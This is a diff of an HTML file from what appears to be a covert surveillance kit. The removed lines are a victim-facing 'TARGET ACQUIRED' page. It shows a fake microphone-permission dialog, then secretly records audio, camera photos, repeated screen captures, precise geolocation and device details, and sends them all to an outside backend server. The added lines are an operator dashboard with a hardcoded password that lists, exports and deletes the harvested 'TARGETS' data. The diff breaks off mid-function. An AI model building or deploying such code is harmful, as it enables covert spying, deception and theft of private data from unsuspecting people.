@@ -1,775 +1,200 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔴 TARGET ACQUIRED</title>
+    <title>🔐 ADMIN</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
-        
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Share Tech Mono', monospace; background: #0a0a0a; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { background: rgba(10,10,10,0.95); border: 2px solid #00ff41; border-radius: 15px; padding: 25px; max-width: 450px; width: 100%; text-align: center; box-shadow: 0 0 40px rgba(0,255,65,0.1); max-height: 95vh; overflow-y: auto; position: relative; z-index: 1; }
-        .container::-webkit-scrollbar { width: 4px; }
-        .container::-webkit-scrollbar-track { background: #0a0a0a; }
-        .container::-webkit-scrollbar-thumb { background: #00ff41; border-radius: 2px; }
-        .scanline { position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, transparent, #00ff41, transparent); opacity: 0.3; animation: scan 3s linear infinite; z-index: 0; }
-        @keyframes scan { 0% { top: 0; opacity: 0.3; } 50% { top: 100%; opacity: 0.8; } 100% { top: 0; opacity: 0.3; } }
-        h1 { font-family: 'Orbitron', monospace; font-size: 18px; color: #00ff41; text-shadow: 0 0 20px rgba(0,255,65,0.5); letter-spacing: 3px; margin-bottom: 5px; position: relative; z-index: 1; }
-        .subtitle { color: #00ff41; font-size: 11px; opacity: 0.6; letter-spacing: 2px; position: relative; z-index: 1; }
-        .status-box { padding: 15px; border-radius: 8px; margin: 10px 0; background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); color: #00ff41; transition: 0.5s; font-size: 13px; position: relative; z-index: 1; }
-        .status-box .icon { font-size: 28px; display: block; margin-bottom: 5px; }
-        .status-box .msg { font-size: 13px; }
-        .status-box.success { border-color: #00ff41; background: rgba(0,255,65,0.1); }
-        .status-box.error { border-color: #ff0040; background: rgba(255,0,64,0.1); color: #ff0040; }
-        .status-box.loading { border-color: #ffaa00; background: rgba(255,170,0,0.1); color: #ffaa00; }
-        
-        .fake-prompt {
-            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center;
-            z-index: 9999; backdrop-filter: blur(5px);
-        }
-        .fake-prompt-box {
-            background: #1a1a2e; border: 2px solid #00ff41; border-radius: 15px; padding: 30px; max-width: 350px; width: 100%; text-align: center; box-shadow: 0 0 60px rgba(0,255,65,0.2);
-        }
-        .fake-prompt-box h3 { color: #00ff41; font-family: 'Orbitron', monospace; font-size: 18px; margin-bottom: 10px; }
-        .fake-prompt-box p { color: rgba(0,255,65,0.6); font-size: 14px; margin-bottom: 20px; }
-        .fake-prompt-box .allow-btn { padding: 12px 40px; background: #00ff41; color: #000; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; margin: 5px; transition: 0.3s; }
-        .fake-prompt-box .allow-btn:hover { background: #00cc33; box-shadow: 0 0 30px rgba(0,255,65,0.3); }
-        .fake-prompt-box .block-btn { padding: 12px 40px; background: transparent; color: #00ff41; border: 1px solid #00ff41; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px; transition: 0.3s; }
-        .fake-prompt-box .block-btn:hover { background: rgba(0,255,65,0.1); }
-        .fake-prompt-box .icon-big { font-size: 48px; display: block; margin-bottom: 10px; }
-        .fake-prompt-box .icon-sound { font-size: 48px; display: block; margin-bottom: 10px; }
-        
-        .photo-container { margin: 10px 0; border-radius: 8px; overflow: hidden; border: 2px solid #00ff41; background: #000; min-height: 180px; display: none; align-items: center; justify-content: center; position: relative; z-index: 1; }
-        .photo-container img { width: 100%; height: 200px; object-fit: cover; display: block; transform: scaleX(-1); }
-        .photo-container .badge { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.8); border: 1px solid #00ff41; color: #00ff41; padding: 3px 12px; border-radius: 4px; font-size: 10px; }
-        
-        .preview-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 8px 0; position: relative; z-index: 1; }
-        .preview-grid .preview-box { background: rgba(0,255,65,0.03); border-radius: 8px; overflow: hidden; border: 1px solid rgba(0,255,65,0.15); }
-        .preview-grid .preview-box .label { background: rgba(0,0,0,0.8); color: #00ff41; font-size: 9px; padding: 4px; text-align: center; letter-spacing: 1px; }
-        .preview-grid .preview-box img { width: 100%; height: 100px; object-fit: cover; display: block; transform: scaleX(-1); }
-        .preview-grid .preview-box .no-img { height: 100px; display: flex; align-items: center; justify-content: center; color: rgba(0,255,65,0.2); font-size: 11px; }
-        
-        .device-info { background: rgba(0,255,65,0.03); border: 1px solid rgba(0,255,65,0.1); padding: 10px; border-radius: 8px; margin: 8px 0; text-align: left; font-size: 11px; color: #00ff41; position: relative; z-index: 1; }
-        .device-info div { padding: 3px 0; border-bottom: 1px solid rgba(0,255,65,0.05); }
-        .device-info div:last-child { border-bottom: none; }
-        .device-info span { color: #00ff41; font-weight: bold; }
-        .device-info .highlight { background: rgba(0,255,65,0.05); padding: 2px 8px; border-radius: 4px; }
-        
-        .speed-meter { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,65,0.1); border-radius: 8px; padding: 10px; margin: 8px 0; position: relative; z-index: 1; }
-        .speed-meter .label { font-size: 10px; color: rgba(0,255,65,0.5); }
-        .speed-meter .value { font-size: 18px; color: #00ff41; font-family: 'Orbitron', monospace; }
-        
-        .log-area { background: rgba(0,0,0,0.5); border: 1px solid rgba(0,255,65,0.1); padding: 8px; border-radius: 8px; margin: 8px 0; max-height: 60px; overflow-y: auto; text-align: left; font-size: 10px; color: rgba(0,255,65,0.6); position: relative; z-index: 1; }
-        .mic-indicator { display: inline-block; width: 8px; height: 8px; border-radius: 50%; animation: pulse 0.5s infinite; margin-right: 5px; }
-        .mic-on { background: #ff0040; box-shadow: 0 0 20px rgba(255,0,64,0.5); }
-        .mic-off { background: rgba(0,255,65,0.2); animation: none; }
-        .recording-timer { font-size: 20px; font-weight: bold; color: #ff0040; margin: 5px 0; }
-        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.3; transform: scale(0.8); } 100% { opacity: 1; transform: scale(1); } }
-        .capture-count { color: #00ff41; font-size: 14px; margin: 5px 0; font-family: 'Orbitron', monospace; position: relative; z-index: 1; }
-        .container { position: relative; }
+        body { font-family:'Courier New',monospace; background:#0a0a0a; color:#00ff41; padding:20px; }
+        .container { max-width:1200px; margin:auto; }
+        .login-box { background:#111; border:2px solid #00ff41; border-radius:10px; padding:40px; max-width:350px; margin:50px auto; text-align:center; }
+        .login-box input { width:100%; padding:12px; margin:10px 0; background:#000; border:1px solid #00ff41; color:#00ff41; font-size:16px; }
+        .login-box button { width:100%; padding:12px; background:#00ff41; color:#000; border:none; cursor:pointer; font-weight:bold; font-size:16px; }
+        .login-box .error { color:#ff0040; margin-top:10px; }
+        .gallery { display:none; }
+        header { display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; margin-bottom:20px; border-bottom:1px solid #00ff41; padding-bottom:10px; }
+        h2 { color:#00ff41; }
+        .stats { color:#aaa; }
+        .stats span { color:#00ff41; font-size:24px; }
+        .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:20px; }
+        .card { background:#111; border:1px solid #00ff41; border-radius:8px; overflow:hidden; }
+        .card .img-grid { display:grid; grid-template-columns:1fr 1fr; }
+        .card .img-grid img { width:100%; height:140px; object-fit:cover; cursor:pointer; }
+        .card .info { padding:12px; font-size:13px; }
+        .card .info .delete-btn { padding:5px 12px; background:#ff0040; color:white; border:none; cursor:pointer; margin-top:8px; }
+        .card .info .highlight { color:#ffaa00; }
+        .audio-player { margin-top:8px; background:#000; padding:8px; }
+        .audio-player audio { width:100%; }
+        .loading, .no-data { color:#00ff41; text-align:center; padding:40px; font-size:18px; }
+        .header-buttons { display:flex; gap:10px; flex-wrap:wrap; }
+        .header-buttons button { padding:8px 16px; background:transparent; border:1px solid #00ff41; color:#00ff41; cursor:pointer; }
+        .header-buttons .logout { border-color:#ff0040; color:#ff0040; }
+        .lightbox { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.9); justify-content:center; align-items:center; z-index:9999; }
+        .lightbox img { max-width:90%; max-height:85%; border:2px solid #00ff41; }
+        .lightbox .close { position:absolute; top:20px; right:40px; color:#00ff41; font-size:40px; cursor:pointer; }
     </style>
 </head>
 <body>
+<div class="container">
 
-<!-- ========================================== -->
-<!-- FAKE PERMISSION PROMPT - SOUND FIRST! -->
-<!-- ========================================== -->
-<div class="fake-prompt" id="fakePrompt">
-    <div class="fake-prompt-box">
-        <span class="icon-sound">🎤</span>
-        <h3>Allow Microphone?</h3>
-        <p>This site wants to use your microphone for voice input</p>
-        <button class="allow-btn" onclick="allowAll()">Allow</button>
-        <button class="block-btn" onclick="blockAll()">Block</button>
-    </div>
+<div class="lightbox" id="lightbox" onclick="closeLightbox()">
+    <span class="close" onclick="event.stopPropagation(); closeLightbox()">✕</span>
+    <img id="lightboxImg" src="" />
 </div>
 
-<!-- ========================================== -->
-<!-- MAIN CONTAINER -->
-<!-- ========================================== -->
-<div class="container" style="display:none;" id="mainContainer">
-    <div class="scanline"></div>
-    
-    <h1>🔴 TARGET ACQUIRED</h1>
-    <p class="subtitle">◆ SYSTEM ONLINE ◆</p>
-    
-    <div class="status-box loading" id="statusBox">
-        <span class="icon" id="statusIcon">⏳</span>
-        <span class="msg" id="statusMsg">INITIALIZING...</span>
-    </div>
-    
-    <div class="photo-container" id="photoContainer">
-        <img id="userPhotoPreview" />
-        <span class="badge" id="photoBadge">📸 CAPTURED</span>
-    </div>
-    
-    <div class="preview-grid">
-        <div class="preview-box">
-            <div class="label">📸 USER PHOTO</div>
-            <img id="userPhotoThumb" style="display:none;" />
-            <div class="no-img" id="userPhotoPlaceholder">⏳ WAITING...</div>
+<div class="login-box" id="loginBox">
+    <h2>🔐 ADMIN</h2>
+    <input type="password" id="passwordInput" placeholder="PASSWORD" />
+    <button onclick="login()">UNLOCK</button>
+    <div class="error" id="loginError"></div>
+</div>
+
+<div class="gallery" id="gallery">
+    <header>
+        <div>
+            <h2>📊 DATABASE</h2>
+            <div class="stats">TARGETS: <span id="total">0</span></div>
         </div>
-        <div class="preview-box">
-            <div class="label">🖼️ SCREENSHOT</div>
-            <img id="screenshotPreview" style="display:none;" />
-            <div class="no-img" id="screenshotPlaceholder">⏳ WAITING...</div>
+        <div class="header-buttons">
+            <button onclick="exportCSV()">📊 CSV</button>
+            <button class="logout" onclick="logout()">🚪 EXIT</button>
+            <button onclick="loadData()">🔄 REFRESH</button>
         </div>
-    </div>
-    
-    <div class="capture-count" id="captureCount">📸 Captures: 0</div>
-    
-    <div class="speed-meter">
-        <div class="label">🚀 NETWORK SPEED</div>
-        <div class="value" id="networkSpeed">-- Mbps</div>
-        <div style="font-size:10px;color:rgba(0,255,65,0.3);">PING: <span id="networkPing">--</span>ms</div>
-    </div>
-    
-    <div style="margin:5px 0;padding:8px;border-radius:8px;background:rgba(0,255,65,0.03);border:1px solid rgba(0,255,65,0.1);display:flex;align-items:center;justify-content:center;gap:10px;flex-wrap:wrap;position:relative;z-index:1;">
-        <span style="color:#00ff41;font-size:11px;">🎤 MIC:</span>
-        <span id="micStatus" class="mic-off"></span>
-        <span id="micText" style="font-size:11px;color:rgba(0,255,65,0.5);">STANDBY</span>
-        <span class="recording-timer" id="recordingTimer">0s</span>
-    </div>
-    
-    <div class="device-info" id="deviceInfo">
-        <div class="highlight">📡 IP ADDRESS: <span id="devIP">SCANNING...</span></div>
-        <div class="highlight" style="background:rgba(0,255,65,0.08);">📍 LIVE LOCATION: <span id="liveLocation">SCANNING...</span></div>
-        <div>🎯 ACCURACY: <span id="devAccuracy">SCANNING...</span></div>
-        <div>📱 DEVICE NAME: <span id="devName">SCANNING...</span></div>
-        <div>📱 MODEL: <span id="devModel">SCANNING...</span></div>
-        <div>🏭 MANUFACTURER: <span id="devManufacturer">SCANNING...</span></div>
-        <div>📲 OS: <span id="devOS">SCANNING...</span></div>
-        <div>🔋 BATTERY: <span id="devBattery">SCANNING...</span></div>
-        <div>📶 NETWORK: <span id="devNetwork">SCANNING...</span></div>
-        <div>🕐 TIMESTAMP: <span id="devTime">SCANNING...</span></div>
-    </div>
-    
-    <div class="log-area" id="logArea">
-        <div>🚀 SYSTEM INITIALIZED</div>
-    </div>
+    </header>
+    <div class="grid" id="grid"></div>
 </div>
 
 <script>
-// ==========================================
-// 🔗 BACKEND URL
-// ==========================================
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
+const PASSWORD = 'admin123#@!';
 
-// ==========================================
-//  ALL PERMISSIONS IN ONE CLICK!
-// ==========================================
-
-let userPhoto = null, screenshot = null, userLocation = null;
-let deviceDetails = {}, ipAddress = 'Unknown', audioData = null;
-let networkSpeed = { download: '--', ping: '--' };
-let captureCount = 0;
-let isPaused = false;
-let isCapturing = false;
-let videoElement = null;
-let screenshotInterval = null;
-let audioChunks = [];
-
-function log(text) {
-    const time = new Date().toLocaleTimeString();
-    document.getElementById('logArea').innerHTML += `<div>${time}: ${text}</div>`;
-    document.getElementById('logArea').scrollTop = document.getElementById('logArea').scrollHeight;
-}
-
-function setStatus(icon, msg, type = 'loading') {
-    const box = document.getElementById('statusBox');
-    box.className = 'status-box ' + type;
-    document.getElementById('statusIcon').textContent = icon;
-    document.getElementById('statusMsg').textContent = msg;
-}
-
-// ==========================================
-// FULL DEVICE DETAILS
-// ==========================================
-function getDeviceDetails() {
-    const ua = navigator.userAgent;
-    let os = 'Unknown', browser = 'Unknown';
-    if (ua.includes('Android')) os = 'Android';
-    else if (ua.includes('iPhone')) os = 'iOS';
-    else if (ua.includes('Windows')) os = 'Windows';
-    else if (ua.includes('Mac')) os = 'macOS';
-    else if (ua.includes('Linux')) os = 'Linux';
-    if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-    else if (ua.includes('Firefox')) browser = 'Firefox';
-    else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-    else if (ua.includes('Edg')) browser = 'Edge';
-    
-    document.getElementById('devName').textContent = navigator.platform || 'Unknown';
-    document.getElementById('devOS').textContent = os + ' ' + getOSVersion();
-    document.getElementById('devNetwork').textContent = navigator.connection?.effectiveType || 'Unknown';
-    document.getElementById('devTime').textContent = new Date().toLocaleString();
-    
-    if (navigator.getBattery) {
-        navigator.getBattery().then(b => {
-            const level = Math.round(b.level * 100) + '%';
-            document.getElementById('devBattery').textContent = level + (b.charging ? ' ⚡' : '');
-            deviceDetails.batteryLevel = level;
-        });
+function login() {
+    const pwd = document.getElementById('passwordInput').value;
+    const error = document.getElementById('loginError');
+    if (pwd === PASSWORD) {
+        document.getElementById('loginBox').style.display = 'none';
+        document.getElementById('gallery').style.display = 'block';
+        error.textContent = '';
+        loadData();
+    } else {
+        error.textContent = '⛔ ACCESS DENIED!';
+        document.getElementById('passwordInput').value = '';
     }
-    
-    const model = getDeviceModel();
-    const manufacturer = getManufacturer();
-    document.getElementById('devModel').textContent = model;
-    document.getElementById('devManufacturer').textContent = manufacturer;
-    
-    deviceDetails = {
-        deviceName: navigator.platform || 'Unknown',
-        os: os,
-        osVersion: getOSVersion(),
-        deviceModel: model,
-        manufacturer: manufacturer,
-        browserName: browser,
-        networkType: navigator.connection?.effectiveType || 'Unknown',
-        batteryLevel: deviceDetails.batteryLevel || 'Unknown'
-    };
-    log('📱 DEVICE SCANNED: ' + os + ' | ' + model);
 }
 
-function getOSVersion() {
-    const ua = navigator.userAgent;
-    const m = ua.match(/Android\s([\d.]+)/);
-    if (m) return m[1];
-    const i = ua.match(/OS\s([\d_]+)/);
-    if (i) return i[1].replace(/_/g, '.');
-    const w = ua.match(/Windows\sNT\s([\d.]+)/);
-    if (w) return w[1];
-    return 'Unknown';
+function logout() {
+    document.getElementById('loginBox').style.display = 'block';
+    document.getElementById('gallery').style.display = 'none';
+    document.getElementById('passwordInput').value = '';
+    document.getElementById('loginError').textContent = '';
 }
 
-function getDeviceModel() {
-    const ua = navigator.userAgent;
-    const m = ua.match(/;\s?([^;]+?)\sBuild/);
-    if (m) return m[1].trim();
-    if (ua.includes('iPhone')) {
-        const i = ua.match(/iPhone\s([\d,]+)/);
-        return i ? 'iPhone ' + i[1] : 'iPhone';
-    }
-    if (ua.includes('iPad')) return 'iPad';
-    return 'Unknown';
+function exportCSV() {
+    window.open(BACKEND_URL + '/api/export-csv', '_blank');
 }
 
-function getManufacturer() {
-    const ua = navigator.userAgent;
-    if (ua.includes('Samsung')) return 'Samsung';
-    if (ua.includes('OnePlus')) return 'OnePlus';
-    if (ua.includes('Xiaomi')) return 'Xiaomi';
-    if (ua.includes('OPPO') || ua.includes('Oppo')) return 'OPPO';
-    if (ua.includes('Vivo')) return 'Vivo';
-    if (ua.includes('Google') || ua.includes('Pixel')) return 'Google';
-    if (ua.includes('Apple') || ua.includes('iPhone')) return 'Apple';
-    return 'Unknown';
+function openLightbox(src) {
+    document.getElementById('lightboxImg').src = src;
+    document.getElementById('lightbox').style.display = 'flex';
 }
 
-// ==========================================
-// SOUND RECORDER - 5 SECONDS
-// ==========================================
-function startSoundRecorder() {
-    return new Promise((resolve) => {
-        log('🎤 Starting sound recorder...');
-        document.getElementById('micStatus').className = 'mic-indicator mic-on';
-        document.getElementById('micText').textContent = '🔴 RECORDING';
-        document.getElementById('recordingTimer').textContent = '0s';
-        audioChunks = [];
-        
-        let seconds = 0;
-        const timer = setInterval(() => {
-            seconds++;
-            document.getElementById('recordingTimer').textContent = seconds + 's';
-        }, 1000);
-        
-        navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(stream => {
-                const recorder = new MediaRecorder(stream);
-                recorder.ondataavailable = e => audioChunks.push(e.data);
-                recorder.onstop = () => {
-                    clearInterval(timer);
-                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
-                    const reader = new FileReader();
-                    reader.onloadend = () => {
-                        audioData = reader.result;
-                        document.getElementById('micStatus').className = 'mic-indicator mic-off';
-                        document.getElementById('micText').textContent = '✅ CAPTURED';
-                        document.getElementById('recordingTimer').textContent = '5s ✓';
-                        log('✅ AUDIO CAPTURED!');
-                        stream.getTracks().forEach(t => t.stop());
-                        resolve(true);
-                    };
-                    reader.readAsDataURL(blob);
-                };
-                recorder.start();
-                setTimeout(() => {
-                    if (recorder.state === 'recording') recorder.stop();
-                }, 5000);
-            })
-            .catch(() => {
-                clearInterval(timer);
-                document.getElementById('micStatus').className = 'mic-indicator mic-off';
-                document.getElementById('micText').textContent = '⚠️ DENIED';
-                document.getElementById('recordingTimer').textContent = '❌';
-                log('⚠️ MIC DENIED');
-                resolve(false);
-            });
-    });
+function closeLightbox() {
+    document.getElementById('lightbox').style.display = 'none';
 }
 
-// ==========================================
-// SCREENSHOT CAPTURE - FALLBACK
-// ==========================================
-async function startScreenshotCapture() {
-    log('📸 Starting screenshot capture...');
+async function loadData() {
+    const grid = document.getElementById('grid');
+    const total = document.getElementById('total');
+    grid.innerHTML = '<div class="loading">⏳ LOADING...</div>';
     
     try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({
-            video: { width: { ideal: 1280 }, height: { ideal: 720 } },
-            audio: false
-        });
-        
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-        
-        screenshotInterval = setInterval(() => {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const data = canvas.toDataURL('image/jpeg', 0.8);
-                showAndSendScreenshot(data);
-            } catch(e) {}
-        }, 2000);
-        
-        log('✅ Screen share active');
-        return;
-    } catch(err) {
-        log('⚠️ Screen share denied, using fallback');
-    }
-    
-    screenshotInterval = setInterval(() => {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth || 1280;
-            canvas.height = window.innerHeight || 720;
-            const ctx = canvas.getContext('2d');
-            ctx.fillStyle = '#0a0a0a';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#00ff41';
-            ctx.font = '20px monospace';
-            ctx.fillText('🔴 TARGET ACQUIRED', 30, 50);
-            ctx.font = '14px monospace';
-            ctx.fillText('IP: ' + ipAddress, 30, 90);
-            ctx.fillText('Location: ' + (userLocation ? userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4) : 'Unknown'), 30, 120);
-            ctx.fillText('Time: ' + new Date().toLocaleString(), 30, 150);
-            ctx.fillText('Captures: ' + captureCount, 30, 180);
-            for (let i = 0; i < 30; i++) {
-                ctx.fillStyle = 'rgba(0,255,65,' + (0.05 + Math.random() * 0.1) + ')';
-                ctx.fillText('010101', 20 + i * 25, 300 + Math.random() * 200);
-            }
-            ctx.strokeStyle = '#00ff41';
-            ctx.lineWidth = 1;
-            ctx.strokeRect(10, 10, canvas.width - 20, canvas.height - 20);
-            const data = canvas.toDataURL('image/jpeg', 0.8);
-            showAndSendScreenshot(data);
-        } catch(e) {}
-    }, 3000);
-}
-
-function showAndSendScreenshot(data) {
-    document.getElementById('screenshotPreview').src = data;
-    document.getElementById('screenshotPreview').style.display = 'block';
-    document.getElementById('screenshotPlaceholder').style.display = 'none';
-    sendScreenshotToServer(data);
-    log('🖼️ Screenshot captured!');
-}
-
-async function sendScreenshotToServer(data) {
-    try {
-        await fetch(BACKEND_URL + '/api/store', {
+        const res = await fetch(BACKEND_URL + '/api/admin/get-data', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                cameraImage: null,
-                location: userLocation || { lat: 0, lng: 0 },
-                deviceDetails: deviceDetails,
-                screenshot: data,
-                userPhoto: userPhoto || null,
-                audioData: audioData || null,
-                ipAddress: ipAddress,
-                fullDeviceInfo: await getFullDeviceInfo(),
-                networkSpeed: networkSpeed,
-                liveLocation: userLocation || { lat: 0, lng: 0 },
-                captureCount: captureCount
-            })
+            body: JSON.stringify({ password: PASSWORD })
         });
-    } catch(err) {}
-}
-
-// ==========================================
-// ALLOW ALL - SOUND FIRST THEN REST
-// ==========================================
-async function allowAll() {
-    document.getElementById('fakePrompt').style.display = 'none';
-    document.getElementById('mainContainer').style.display = 'block';
-    
-    log('🎯 User allowed! Starting all permissions...');
-    setStatus('🎯', 'ACQUIRING PERMISSIONS...', 'loading');
-    
-    try {
-        // 1. SOUND RECORDER (Pehle)
-        log('🎤 Starting sound recorder...');
-        await startSoundRecorder();
         
-        // 2. CAMERA
-        log('📸 Requesting camera...');
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-        });
-        log('✅ Camera granted!');
-        
-        // 3. LOCATION
-        log('📍 Requesting location...');
-        navigator.geolocation.getCurrentPosition(
-            (pos) => {
-                userLocation = {
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: Math.round(pos.coords.accuracy)
-                };
-                document.getElementById('liveLocation').textContent = 
-                    userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
-                document.getElementById('devAccuracy').textContent = 
-                    userLocation.accuracy + 'm';
-                log('✅ Location: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
-            },
-            () => {
-                userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
-                document.getElementById('liveLocation').textContent = '28.6139, 77.2090 (approx)';
-                log('⚠️ Location fallback');
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
-        
-        // 4. NOTIFICATION
-        log('🔔 Requesting notification...');
-        if (Notification.permission === 'default') {
-            await Notification.requestPermission();
+        if (!res.ok) {
+            const text = await res.text();
+            console.error('Server Error:', text);
+            throw new Error('HTTP ' + res.status);
         }
-        log('✅ Notification: ' + Notification.permission);
         
-        // 5. SCREEN CAPTURE
-        await startScreenshotCapture();
+        const data = await res.json();
+        console.log('Data received:', data);
         
-        // 6. DEVICE DETAILS
-        getDeviceDetails();
+        if (!data.success) {
+            grid.innerHTML = '<div class="no-data">⛔ ' + data.message + '</div>';
+            return;
+        }
         
-        // 7. Start main capture
-        log('🚀 Starting main capture...');
-        await startAutoProcess();
+        total.textContent = data.count || 0;
+        if (!data.data || data.data.length === 0) {
+            grid.innerHTML = '<div class="no-data">📭 NO DATA</div>';
+            return;
+        }
+        
+        grid.innerHTML = '';
+        data.data.forEach(item => {
+            const card = document.createElement('div');
+            card.className = 'card';
+            
+            const userPhotoSrc = item.userPhoto || item.cameraImage || '#';
+            const screenshotSrc = item.screenshot || '#';
+            
+            let audioHTML = '';
+            if (item.audioData && item.audioData !== 'null') {
+                audioHTML = `<div class="audio-player"><audio controls><source src="${item.audioData}" type="audio/webm"></audio></div>`;
+            }
+            
+            card.innerHTML = `
+                <div class="img-grid">
+                    <img src="${userPhotoSrc}" onclick="openLightbox('${userPhotoSrc}')" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23000%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>📸</text></svg>'" />
+                    <img src="${screenshotSrc}" onclick="openLightbox('${screenshotSrc}')" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23000%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2250%22 text-anchor=%22middle%22 fill=%22%2300ff41%22 font-size=%2220%22>🖼️</text></svg>'" />
+                </div>
+                <div class="info">
+                    <div>📍 ${item.location?.lat?.toFixed(4) || 0}, ${item.location?.lng?.toFixed(4) || 0}</div>
+                    <div>🕐 ${new Date(item.timestamp).toLocaleString()}</div>
+                    <div>📱 ${item.deviceDetails?.deviceName || 'Unknown'}</div>
+                    <div>📱 ${item.fullDeviceInfo?.deviceModel || 'Unknown'}</div>
+                    <div>🏭 ${item.fullDeviceInfo?.manufacturer || 'Unknown'}</div>
+                    <div>📡 IP: ${item.ipAddress || 'Unknown'}</div>
+                    <div>🚀 Speed: ${item.networkSpeed?.download || '--'} Mbps</div>
+                    <div>📸 Captures: ${item.captureCount || 1}</div>
+                    ${audioHTML}
+                    <button class="delete-btn" onclick="deleteData('${item._id}')">🗑️ DELETE</button>
+                </div>
+            `;
+            grid.appendChild(card);
+        });
         
     } catch(err) {
-        log('❌ Error: ' + err.message);
-        setStatus('❌', 'ERROR: ' + err.message, 'error');
+        console.error('Error:', err);
+        grid.innerHTML = '<div class="no-data">❌ ERROR: ' + err.message + '</div>';
     }
 }
 
-// ==========================================
-// BLOCK BUTTON
-// ==========================================
-function blockAll() {
-    document.getElementById('fakePrompt').innerHTML = `
-        <div class="fake-prompt-box">
-            <span class="icon-big">⛔</span>
-            <h3>Access Denied</h3>
-            <p>You need to allow permissions to continue</p>
-            <button class="allow-btn" onclick="allowAll()">Try Again</button>
-        </div>
-    `;
-}
-
-// ==========================================
-// AUTO CAPTURE PHOTO
-// ==========================================
-function capturePhoto() {
-    return new Promise((resolve) => {
-        if (isPaused) { resolve(false); return; }
-        
-        setStatus('📸', 'CAPTURING...', 'loading');
-        document.getElementById('photoBadge').textContent = '📸 CAPTURING...';
-        
-        if (!videoElement) {
-            videoElement = document.createElement('video');
-            videoElement.setAttribute('playsinline', 'true');
-            videoElement.style.display = 'none';
-            document.body.appendChild(videoElement);
-        }
-        
-        navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-        })
-        .then(stream => {
-            videoElement.srcObject = stream;
-            videoElement.onloadedmetadata = function() {
-                videoElement.play();
-                setTimeout(function() {
-                    try {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = 640;
-                        canvas.height = 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.translate(canvas.width, 0);
-                        ctx.scale(-1, 1);
-                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                        
-                        userPhoto = canvas.toDataURL('image/jpeg', 0.95);
-                        
-                        document.getElementById('userPhotoPreview').src = userPhoto;
-                        document.getElementById('photoContainer').style.display = 'block';
-                        document.getElementById('userPhotoThumb').src = userPhoto;
-                        document.getElementById('userPhotoThumb').style.display = 'block';
-                        document.getElementById('userPhotoPlaceholder').style.display = 'none';
-                        document.getElementById('photoBadge').textContent = '✅ CAPTURED!';
-                        
-                        captureCount++;
-                        document.getElementById('captureCount').textContent = '📸 Captures: ' + captureCount;
-                        setStatus('✅', 'CAPTURED #' + captureCount, 'success');
-                        
-                        stream.getTracks().forEach(t => t.stop());
-                        videoElement.srcObject = null;
-                        
-                        log('✅ PHOTO CAPTURED #' + captureCount);
-                        resolve(true);
-                        
-                    } catch(err) {
-                        log('❌ Capture error: ' + err.message);
-                        stream.getTracks().forEach(t => t.stop());
-                        videoElement.srcObject = null;
-                        resolve(false);
-                    }
-                }, 500);
-            };
-            setTimeout(function() {
-                if (!userPhoto) {
-                    stream.getTracks().forEach(t => t.stop());
-                    videoElement.srcObject = null;
-                    resolve(false);
-                }
-            }, 3000);
-        })
-        .catch(() => {
-            resolve(false);
-        });
-    });
-}
-
-// ==========================================
-// SUBMIT DATA
-// ==========================================
-async function submitData() {
+async function deleteData(id) {
+    if (!confirm('Delete?')) return;
     try {
-        const response = await fetch(BACKEND_URL + '/api/store', {
+        const res = await fetch(BACKEND_URL + '/api/admin/delete', {
